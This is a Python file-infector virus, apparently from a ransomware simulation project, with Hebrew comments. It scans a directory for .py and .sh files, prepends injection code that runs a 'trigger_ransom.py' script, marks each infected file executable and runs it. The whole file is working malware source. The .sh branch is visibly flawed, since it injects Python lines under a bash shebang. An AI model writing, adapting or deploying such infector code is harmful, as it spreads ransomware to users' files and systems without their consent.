
import os
import subprocess

INFECTION_MARKER = "#infected"
INJECTION_CODE = (
    f"{INFECTION_MARKER}\n"
    "import os\n"
    "os.system('python3 /home/korban/ByteMeProject/backend/src/modules/simulation/trigger_ransom.py')\n"
)

TARGET_DIR = "/home/korban/Desktop/TestInfected"
TARGET_EXTENSIONS = ['.py', '.sh']

def is_infected(content):
    return INFECTION_MARKER in content

def infect_file(filepath):
    try:
        with open(filepath, 'r') as f:
            content = f.read()

        if is_infected(content):
            return

        # הוספת shebang לקבצי .sh אם חסר
        if filepath.endswith('.sh') and not content.startswith("#!"):
            content = "#!/bin/bash\n" + content

        # כתיבה מחדש עם קוד ההדבקה
        with open(filepath, 'w') as f:
            f.write(INJECTION_CODE + content)

        # מתן הרשאת הרצה
        os.chmod(filepath, 0o755)

        print(f"[+] Infected & executing: {filepath}")

        # הרצה בפועל
        if filepath.endswith('.py'):
            subprocess.run(['python3', filepath])
        elif filepath.endswith('.sh'):
            subprocess.run([filepath])

    except Exception as e:
        print(f"[-] Failed: {filepath}: {e}")

def scan_and_infect(directory):
    for root, _, files in os.walk(directory):
        for filename in files:
            if any(filename.endswith(ext) for ext in TARGET_EXTENSIONS):
                filepath = os.path.join(root, filename)
                infect_file(filepath)

if __name__ == "__main__":
    scan_and_infect(TARGET_DIR)
